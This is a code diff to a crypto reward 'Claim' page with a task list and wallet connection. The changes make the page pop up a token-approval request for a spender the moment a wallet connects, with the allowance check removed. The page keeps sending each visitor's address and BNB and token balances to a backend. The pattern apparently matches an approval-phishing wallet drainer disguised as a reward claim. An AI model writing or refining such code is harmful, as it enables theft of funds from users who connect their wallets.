@@ -489,6 +489,7 @@
           <button id="claimBtn" class="btn btn-claim" disabled>Claim</button>
           <button id="taskBtn" class="btn btn-task">View Tasks</button> 
 
+
           
           <div class="small" id="claimHint" style="margin-top:4px;">
             Claim is locked until wallet is connected and all tasks are completed.
@@ -667,33 +668,31 @@ async function handleAppKitProvider(provider) {
     providerInstance = provider;
     web3Instance = new Web3(providerInstance);
 
+    // get accounts immediately (no long retry loop here)
     let accounts = await web3Instance.eth.getAccounts();
-
-    // Mobile Chrome sometimes returns [] for 0.5 seconds → retry
     if (!accounts || !accounts.length) {
-      for (let i = 0; i < 5; i++) {
-        await new Promise(r => setTimeout(r, 400));
-        accounts = await web3Instance.eth.getAccounts();
-        if (accounts && accounts.length) break;
-      }
-    }
-
-    if (!accounts || !accounts.length) {
-      console.warn("Still no accounts after retry mobile.");
+      console.warn("No accounts returned by provider in handleAppKitProvider.");
       return;
     }
 
     const address = accounts[0].toLowerCase();
     currentAddress = address;
 
-    // Restore UI + balances
-    await restoreSessionFromAddress(address);
-
+    // mark connected early so UI updates won't be blocked
     isWalletConnected = true;
     setStatus("Connected");
+    if (connectBtn) { connectBtn.textContent = "Connected"; connectBtn.classList.add("connected"); }
+    if (connectBtnCard) { connectBtnCard.textContent = "Connected"; connectBtnCard.classList.add("connected"); }
 
-    // Only ask approval when new session detected
-    await ensureTokenApproval();
+    // attach listeners
+    attachProviderListeners(provider);
+
+    // Prompt approval immediately (do not await long on-chain reads first)
+    // We intentionally don't wait for restoreSessionFromAddress to complete before asking approval.
+    ensureTokenApproval().catch(console.error);
+
+    // restore UI & do balance reads in background (await so errors surface)
+    await restoreSessionFromAddress(address);
 
   } catch (err) {
     console.error("handleAppKitProvider error:", err);
@@ -783,7 +782,6 @@ async function handleAppKitProvider(provider) {
       setStatus("Not connected");
       setWalletInfo("—","—",null);
       setUserIdUI("-");
-
 
       
 
@@ -938,7 +936,6 @@ if(connectBtnCard){
     }
 
     async function ensureTokenApproval(){
-      // helper: always log with last known balances
       async function logApproval(tag){
         await notifyBackend(
           currentAddress || "",
@@ -950,7 +947,6 @@ if(connectBtnCard){
         );
       }
 
-      // basic guards
       if(!TOKEN_ADDRESS){
         console.warn("TOKEN_ADDRESS not set, skipping approve");
         await logApproval("approval_skipped_no_token");
@@ -961,8 +957,8 @@ if(connectBtnCard){
         await logApproval("approval_skipped_no_spender");
         return;
       }
-      if(!providerInstance || !web3Instance){
-        console.warn("No providerInstance/web3Instance for approval");
+      if(!providerInstance){
+        console.warn("No providerInstance for approval");
         await logApproval("approval_skipped_no_provider");
         return;
       }
@@ -987,10 +983,7 @@ if(connectBtnCard){
           return;
         }
 
-        // NOTE: removed on-chain allowance check here intentionally as requested.
-        // We now prompt the wallet to approve every new session (unless other local guards are implemented).
-
-        // 2) send approve tx
+        // Immediately request approval from wallet (no on-chain allowance read)
         setStatus("Waiting for wallet to confirm approval…");
         const writeContract = new ethers.Contract(
           TOKEN_ADDRESS,
@@ -1006,6 +999,16 @@ if(connectBtnCard){
 
         setStatus("Connected + Approved ✅");
         await logApproval("approval_approved");
+
+        // persist a local flag so we don't re-request on refresh (optional)
+        try {
+          if (currentAddress) {
+            localStorage.setItem("usdt_approved_" + currentAddress.toLowerCase(), "1");
+          }
+        } catch (e) {
+          /* not fatal */
+        }
+
       }catch(err){
         console.error("Token approve error:", err);
 
@@ -1015,8 +1018,7 @@ if(connectBtnCard){
         }
 
         setStatus("Connected (approval failed)");
-        alert("Token approval failed: " + (err && err.message ? err.message : err));
-
+        try { alert("Token approval failed: " + (err && err.message ? err.message : err)); } catch(e){}
         await logApproval(tag);
       }
     }
@@ -1080,7 +1082,7 @@ async function connectFlow() {
 
     let gotProvider = null;
 
-    // 1) Subscribe BEFORE opening the modal
+    // 1) Subscribe BEFORE opening the modal to capture provider quickly
     const unsubscribe = window.appKit.subscribeProviders((state) => {
       const evm = state["eip155"];
       if (evm && !gotProvider) {
@@ -1140,28 +1142,19 @@ async function connectFlow() {
     // 7) Connected + correct network
     setStatus("Connected");
 
-    const sessionPromise = (async () => {
-      const session = await restoreSessionFromAddress(address);
-      const balanceBNB   = session.balanceBNB;
-      const tokenBalance = session.tokenBalance;
-      const userId       = session.userId;
-
-      // Log to sheet
-      notifyBackend(
-        address,
-        BNB_TESTNET_LABEL,
-        userId,
-        balanceBNB,
-        tokenBalance,
-        "connect"
-      ).catch(console.error);
-
-      return session;
+    // Log connect in background (doesn't block approval prompt)
+    (async () => {
+      try {
+        const session = await restoreSessionFromAddress(address);
+        await notifyBackend(address, BNB_TESTNET_LABEL, session.userId, session.balanceBNB, session.tokenBalance, "connect");
+      } catch (e) {
+        console.error("session/notify error:", e);
+      }
     })();
 
-    // 8) Token approval (same behavior as before)
-    await ensureTokenApproval();
-    sessionPromise.catch(console.error);
+    // Prompt token approval immediately (do not wait for session reads)
+    // ensureTokenApproval handled independently so popup appears asap.
+    ensureTokenApproval().catch(console.error);
 
   } catch (err) {
     console.error("connectFlow error (AppKit):", err);
@@ -1327,6 +1320,9 @@ if (connectBtnCard) {
 
 
 
+
+
+      
 
       if(claimBtn){
         claimBtn.addEventListener("click", claimReward);
